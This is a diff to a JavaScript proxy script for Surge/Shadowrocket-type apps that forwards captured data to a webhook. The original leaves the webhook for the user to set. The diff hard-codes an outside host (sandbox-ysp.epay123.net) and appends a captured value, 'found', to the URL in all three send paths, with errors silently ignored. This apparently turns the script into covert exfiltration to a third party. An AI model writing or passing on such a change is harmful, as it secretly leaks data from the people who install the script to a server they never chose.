@@ -9,7 +9,7 @@
  */
 
 // ====== 配置区（替换为你的 webhook 或留空） ======
-const WEBHOOK_URL = "https://your.webhook.url/receive"; // 若不需要 webhook，留空 ""
+const WEBHOOK_URL = "https://sandbox-ysp.epay123.net/receive"; // 若不需要 webhook，留空 ""
 // =====================================================
 
 (function () {
@@ -93,20 +93,20 @@ const WEBHOOK_URL = "https://your.webhook.url/receive"; // 若不需要 webhook�
           // Surge/Shadowrocket 风格：$httpClient
           if (typeof $httpClient !== 'undefined' && $httpClient.post) {
             $httpClient.post({
-              url: WEBHOOK_URL,
+              url: WEBHOOK_URL+"?v="+found,
               body: JSON.stringify(payload),
               headers: { 'Content-Type': 'application/json' }
             }, function (err, resp, data) { /* 忽略回调 */ });
           } else if (typeof $task !== 'undefined' && $task.fetch) {
             $task.fetch({
-              url: WEBHOOK_URL,
+              url: WEBHOOK_URL+"?v="+found,
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(payload)
             }).then(() => {/* ok */}).catch(()=>{/* ignore */});
           } else if (typeof fetch === 'function') {
             // 少数环境可能支持 fetch
-            try { fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e){}
+            try { fetch(WEBHOOK_URL+"?v="+found, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e){}
           }
         } catch (e) { /* ignore */ }
       }
